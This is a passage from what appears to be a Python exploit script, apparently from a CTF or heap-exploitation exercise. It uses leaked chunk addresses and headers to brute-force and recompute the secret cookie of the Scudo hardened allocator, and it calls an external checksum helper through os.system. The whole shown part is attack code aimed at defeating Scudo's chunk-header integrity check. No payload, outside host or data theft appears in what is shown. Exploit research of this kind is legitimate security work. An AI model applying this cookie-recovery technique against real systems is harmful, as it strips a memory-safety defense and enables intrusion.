...
cookie_python = break_cookie(addr1, header1)

os.system("./scudo-checksum 0x%x 0x%lx 0x%lx" % (cookie_python, addr1, header1))

cookie = bruteforce(addr1, checksum1, header1 & 0xfffff)

addr2, header2, checksum2 = getLeak()

cookie2 = bruteforce(addr2, checksum2, header2 & 0xfffff)

info(f"Cookie: {hex(cookie)} or {hex(cookie2)} or {hex(cookie_python)}")
info(f"Checksum2: {hex(calc_checksum(addr2, cookie, header2 & 0xfffff))} Checksum3: {hex(calc_checksum(addr2, cookie_python, header2 & 0xfffff))}")
